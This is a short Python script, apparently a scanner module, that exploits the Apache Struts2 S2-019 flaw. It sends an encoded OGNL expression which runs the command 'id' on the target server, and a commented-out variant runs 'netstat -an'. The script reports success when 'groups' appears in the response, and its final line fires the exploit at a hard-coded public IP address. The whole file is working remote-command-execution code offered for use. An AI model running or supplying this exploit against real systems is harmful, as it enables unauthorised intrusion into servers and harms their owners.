import requests
# url要带有action或者do
class struts2_019:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_019'.format(self.url))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        #exp = '''?debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()'''
        exp = '?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27id%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A'
        self.url += exp
        try:
            resp = requests.post(self.url, data=exp, headers=headers, timeout=10)
            if "groups" in resp.text:
                return "s2-019"
        except:
            #print('test --> struts2_019 Failed!')
            return None
        return None
print(struts2_019('http://45.77.123.178/example/HelloWorld.action').attack())